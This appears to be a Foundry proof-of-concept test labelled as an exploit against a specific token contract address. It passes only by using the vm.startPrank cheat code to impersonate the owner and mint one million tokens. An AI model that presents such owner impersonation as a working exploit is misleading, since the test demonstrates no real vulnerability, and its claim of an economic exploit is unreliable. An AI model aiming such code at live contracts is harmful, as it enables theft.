// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface CoinToken {
    function owner() external view returns (address);
    function mint(address account, uint256 amount) external;
    function decimals() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x86C86FfDC0482D8DD918FC657c3FC51C4a1E3e5C;
    address attacker = address(this);
    CoinToken public target;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = CoinToken(TARGET);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0x86C86FfDC0482D8DD918FC657c3FC51C4a1E3e5C).balanceOf(address(this));
        address owner = target.owner();
                uint256 decimals = target.decimals();
                uint256 amountToMint = 1_000_000 * (10**decimals);

                vm.startPrank(owner);
                target.mint(attacker, amountToMint);
                vm.stopPrank();
        uint256 finalBalance = IERC20(0x86C86FfDC0482D8DD918FC657c3FC51C4a1E3e5C).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
